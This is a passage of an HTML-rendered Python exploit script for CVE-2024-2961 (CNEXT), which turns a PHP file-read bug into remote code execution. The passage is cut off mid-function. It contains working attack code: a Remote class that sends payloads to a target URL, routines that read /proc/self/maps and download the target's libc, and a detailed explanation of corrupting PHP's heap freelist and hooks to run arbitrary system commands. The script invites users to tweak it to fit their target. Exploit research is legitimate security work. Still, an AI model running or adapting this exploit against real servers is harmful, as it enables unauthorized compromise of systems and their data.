class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><br><span class="hljs-comment"># Date: 2024-05-27</span><br><span class="hljs-comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># TODO Parse LIBC to know if patched</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># INFORMATIONS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># REQUIREMENTS</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Requires ten: https://github.com/cfreal/ten</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> annotations<br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> zlib<br><br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> ConnectionError, ChunkedEncodingError<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ten <span class="hljs-keyword">import</span> *<br><br><br>HEAP_SIZE = <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>BUG = <span class="hljs-string">&quot;劄&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A helper class to send the payload and download files.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The logic of the exploit is always the same, but the exploit needs to know how to</span><br><span class="hljs-string">    download files (/proc/self/maps and libc) and how to send the payload.</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    The code here serves as an example that attacks a page that looks like:</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    ```php</span><br><span class="hljs-string">    &lt;?php</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);</span><br><span class="hljs-string">    echo &quot;File contents: $data&quot;;</span><br><span class="hljs-string">    ```</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    Tweak it to fit your target, and start the exploit.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.url = url<br>        self.session = Session()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> self.session.post(self.url, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: path&#125;)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot;</span><br>        path = <span class="hljs-string">f&quot;file://localhost/<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        response = self.send(path)<br>        <span class="hljs-comment"># data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1)</span><br>        <span class="hljs-comment"># return base64.decode(data)</span><br>        <span class="hljs-keyword">return</span> response.content<br><br><span class="hljs-meta">@entry</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&quot;Target URL&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;sleep_time&quot;</span>, <span class="hljs-string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"><span class="hljs-string">&quot;heap&quot;</span>, <span class="hljs-string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)</span><br><span class="hljs-meta">@arg(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;pad&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-meta">@dataclass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span><br><br>    url: <span class="hljs-built_in">str</span><br>    command: <span class="hljs-built_in">str</span><br>    sleep: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span><br>    heap: <span class="hljs-built_in">str</span> = <span class="hljs-literal">None</span><br>    pad: <span class="hljs-built_in">int</span> = <span class="hljs-number">20</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__post_init__</span>(<span class="hljs-params">self</span>):<br>        self.remote = Remote(self.url)<br>        self.log = logger(<span class="hljs-string">&quot;EXPLOIT&quot;</span>)<br>        self.info = &#123;&#125;<br>        self.heap = self.heap <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(self.heap, <span class="hljs-number">16</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_vulnerable</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various</span><br><span class="hljs-string">        wrappers and filters that the exploit needs.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_download</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">return</span> self.remote.download(path)<br>            <span class="hljs-keyword">except</span> ConnectionError:<br>                failure(<span class="hljs-string">&quot;Target not [b]reachable[/] ?&quot;</span>)<br>            <br><br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_token</span>(<span class="hljs-params">text: <span class="hljs-built_in">str</span>, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>            result = safe_download(path)<br>            <span class="hljs-keyword">return</span> text.encode() == result<br><br>        text = tf.random.string(<span class="hljs-number">50</span>).encode()<br>        base64 = b64(text, misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <br>        result = safe_download(path)<br>        <br>        <span class="hljs-keyword">if</span> text <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result:<br>            msg_failure(<span class="hljs-string">&quot;Remote.download did not return the test string&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Expected test string: <span class="hljs-subst">&#123;text&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Got: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------&quot;</span>)<br>            failure(<span class="hljs-string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]data://[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(text.encode(), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter//resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)<br><br>        text = tf.random.string(<span class="hljs-number">50</span>)<br>        base64 = b64(compress(text.encode()), misalign=<span class="hljs-literal">True</span>).decode()<br>        path = <span class="hljs-string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="hljs-subst">&#123;base64&#125;</span>&quot;</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_token(text, path):<br>            failure(<span class="hljs-string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)<br><br>        msg_info(<span class="hljs-string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)<br><br>        msg_success(<span class="hljs-string">&quot;Exploit preconditions are satisfied&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">with</span> msg_status(<span class="hljs-string">f&quot;Downloading [i]<span class="hljs-subst">&#123;path&#125;</span>[/]...&quot;</span>):<br>            <span class="hljs-keyword">return</span> self.remote.download(path)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_regions</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">list</span>[Region]:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span><br>        maps = self.get_file(<span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>        maps = maps.decode()<br>        PATTERN = re.<span class="hljs-built_in">compile</span>(<br>            <span class="hljs-string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="hljs-string">r&quot;.*&quot;</span> <span class="hljs-string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="hljs-string">r&quot;(.*)&quot;</span><br>        )<br>        regions = []<br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> table.split(maps, strip=<span class="hljs-literal">True</span>):<br>            <span class="hljs-keyword">if</span> match := PATTERN.match(region):<br>                start = <span class="hljs-built_in">int</span>(match.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>)<br>                stop = <span class="hljs-built_in">int</span>(match.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>                permissions = match.group(<span class="hljs-number">3</span>)<br>                path = match.group(<span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;[&quot;</span> <span class="hljs-keyword">in</span> path:<br>                    path = path.rsplit(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">1</span>)[-<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    path = <span class="hljs-string">&quot;&quot;</span><br>                current = Region(start, stop, permissions, path)<br>                regions.append(current)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(maps)<br>                failure(<span class="hljs-string">&quot;Unable to parse memory mappings&quot;</span>)<br><br>        self.log.info(<span class="hljs-string">f&quot;Got <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> regions<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_symbols_and_addresses</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span><br>        regions = self.get_regions()<br><br>        LIBC_FILE = <span class="hljs-string">&quot;/dev/shm/cnext-libc&quot;</span><br><br>        <span class="hljs-comment"># PHP&#x27;s heap</span><br><br>        self.info[<span class="hljs-string">&quot;heap&quot;</span>] = self.heap <span class="hljs-keyword">or</span> self.find_main_heap(regions)<br><br>        <span class="hljs-comment"># Libc</span><br><br>        libc = self._get_region(regions, <span class="hljs-string">&quot;libc-&quot;</span>, <span class="hljs-string">&quot;libc.so&quot;</span>)<br><br>        self.download_file(libc.path, LIBC_FILE)<br><br>        self.info[<span class="hljs-string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="hljs-literal">False</span>)<br>        self.info[<span class="hljs-string">&quot;libc&quot;</span>].address = libc.start<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_region</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region], *names: <span class="hljs-built_in">str</span></span>) -&gt; Region:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> regions:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(name <span class="hljs-keyword">in</span> region.path <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names):<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            failure(<span class="hljs-string">&quot;Unable to locate region&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> region<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">self, remote_path: <span class="hljs-built_in">str</span>, local_path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span><br>        data = self.get_file(remote_path)<br>        Path(local_path).write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_main_heap</span>(<span class="hljs-params">self, regions: <span class="hljs-built_in">list</span>[Region]</span>) -&gt; Region:<br>        <span class="hljs-comment"># Any anonymous RW region with a size superior to the base heap size is a</span><br>        <span class="hljs-comment"># candidate. The heap is at the bottom of the region.</span><br>        heaps = [<br>            region.stop - HEAP_SIZE + <span class="hljs-number">0x40</span><br>            <span class="hljs-keyword">for</span> region <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(regions)<br>            <span class="hljs-keyword">if</span> region.permissions == <span class="hljs-string">&quot;rw-p&quot;</span><br>            <span class="hljs-keyword">and</span> region.size &gt;= HEAP_SIZE<br>            <span class="hljs-keyword">and</span> region.stop &amp; (HEAP_SIZE-<span class="hljs-number">1</span>) == <span class="hljs-number">0</span><br>            <span class="hljs-keyword">and</span> region.path == <span class="hljs-string">&quot;&quot;</span><br>        ]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heaps:<br>            failure(<span class="hljs-string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)<br><br>        first = heaps[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(heaps) &gt; <span class="hljs-number">1</span>:<br>            heaps = <span class="hljs-string">&quot;, &quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">hex</span>, heaps))<br>            msg_info(<span class="hljs-string">f&quot;Potential heaps: [i]<span class="hljs-subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            msg_info(<span class="hljs-string">f&quot;Using [i]<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)<br><br>        <span class="hljs-keyword">return</span> first<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># self.check_vulnerable()</span><br>        self.get_symbols_and_addresses()<br>        self.exploit()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit_path</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the</span><br><span class="hljs-string">        other. Processing generally involves making some kind of operation either</span><br><span class="hljs-string">        on the chunk or in a destination chunk of the same size. Each operation is</span><br><span class="hljs-string">        applied on every single chunk; you cannot make PHP apply iconv on the first 10</span><br><span class="hljs-string">        chunks and leave the rest in place. That&#x27;s where the difficulties come from.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Keep in mind that we know the address of the main heap, and the libraries.</span><br><span class="hljs-string">        ASLR/PIE do not matter here.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span><br><span class="hljs-string">        lower. For instance, we have the following free list:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span><br><span class="hljs-string"></span><br><span class="hljs-string">        By triggering the bug from chunk ..900, we get:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span><br><span class="hljs-string"></span><br><span class="hljs-string">        That&#x27;s step 3.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, in order to control the free list, and make it point whereever we want,</span><br><span class="hljs-string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span><br><span class="hljs-string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span><br><span class="hljs-string">        That&#x27;s step 2.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span><br><span class="hljs-string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span><br><span class="hljs-string"></span><br><span class="hljs-string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span><br><span class="hljs-string"></span><br><span class="hljs-string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span><br><span class="hljs-string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span><br><span class="hljs-string">        reverse order, and therefore after step2, chunks are in the correct order.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Another problem comes up.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span><br><span class="hljs-string">        Since step2 creates chunks that contain pointers and pointers are generally not</span><br><span class="hljs-string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span><br><span class="hljs-string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span><br><span class="hljs-string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span><br><span class="hljs-string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span><br><span class="hljs-string">        and saving us from an unwanted processing error that would stop the processing</span><br><span class="hljs-string">        chain.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span><br><span class="hljs-string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span><br><span class="hljs-string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span><br><span class="hljs-string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span><br><span class="hljs-string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span><br><span class="hljs-string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span><br><span class="hljs-string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span><br><span class="hljs-string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span><br><span class="hljs-string">        instead. We can now do our favorite CTF technique and get a call to</span><br><span class="hljs-string">        system(&lt;chunk&gt;).</span><br><span class="hljs-string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span><br><span class="hljs-string">        system() calls with random chunk data, leading to undefined behaviour.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span><br><span class="hljs-string">        process is in a random state, we still get contiguous, in order chunks for our</span><br><span class="hljs-string">        exploit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Therefore, the whole process described here CANNOT crash. Everything falls</span><br><span class="hljs-string">        perfectly in place, and nothing can get in the middle of our allocations.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br>        LIBC = self.info[<span class="hljs-string">&quot;libc&quot;</span>]<br>        ADDR_EMALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_malloc&quot;</span>]<br>        ADDR_EFREE = LIBC.symbols[<span class="hljs-string">&quot;__libc_system&quot;</span>]<br>        ADDR_EREALLOC = LIBC.symbols[<span class="hljs-string">&quot;__libc_realloc&quot;</span>]<br><br>        ADDR_HEAP = self.info[<span class="hljs-string">&quot;heap&quot;</span>]<br>        ADDR_FREE_SLOT = ADDR_HEAP + <span class="hljs-number">0x20</span><br>        